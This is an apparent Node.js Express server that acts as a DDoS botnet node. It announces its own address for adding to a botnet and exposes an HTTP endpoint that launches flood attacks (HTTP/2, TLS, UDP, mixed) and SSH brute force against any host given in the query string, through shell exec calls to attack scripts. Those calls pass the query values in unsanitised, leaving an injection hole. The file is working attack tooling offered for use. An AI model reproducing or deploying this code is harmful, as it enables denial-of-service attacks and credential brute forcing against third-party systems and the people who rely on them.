const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Middleware to set JSON response headers and pretty print
app.use((req, res, next) => {
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.jsonPretty = (data) => {
    res.send(JSON.stringify(data, null, 2));
  };
  next();
});

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

function getUsageInfo(req) {
  return {
    "description": "DDoS API Usage Instructions",
    "endpoints": {
      "/": {
        "description": "Launch attack or show usage",
        "required_parameters": {
          "host": "Target IP or domain",
          "port": "Target port",
          "time": "Attack duration in seconds",
          "methods": "Attack method (H2, TLS, FLOOD, MIX, SKIBIDI, UDP, SSH)"
        },
        "example": `http://${req.headers.host}/?host=example.com&port=80&time=60&methods=H2`
      },
      "/get": {
        "description": "Show usage information"
      }
    },
    "available_methods": {
      "H2": "HTTP/2 attack",
      "TLS": "TLS/SSL attack",
      "FLOOD": "General flooding attack",
      "MIX": "Mixed attack vectors",
      "SKIBIDI": "Specialized attack",
      "UDP": "UDP flood",
      "SSH": "SSH brute force"
    },
  };
}

app.get('/get', (req, res) => {
  res.jsonPretty(getUsageInfo(req));
});

app.get('/', (req, res) => {
  const { host, port, time, methods } = req.query;
  
  if (!host || !port || !time || !methods) {
    return res.jsonPretty(getUsageInfo(req));
  }

  res.jsonPretty({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  const attackMethods = {
    'H2': `./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
    'TLS': `./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
    'FLOOD': `./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
    'MIX': `./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
    'SKIBIDI': `./lib/cache/skibidi.js ${host} ${time}`,
    'UDP': `./lib/cache/udp.js ${host} ${port} ${time}`,
    'SSH': `./lib/cache/ssh.js ${host} ${port} root ${time}`
  };

  const selectedMethod = attackMethods[methods];
  
  if (selectedMethod) {
    exec(`node ${selectedMethod}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error}`);
        return;
      }
      console.log(`Executed: ${selectedMethod}`);
    });
  } else {
    console.log(`Unsupported method: ${methods}`);
  }
});

app.listen(port, () => {
  fetchData();
});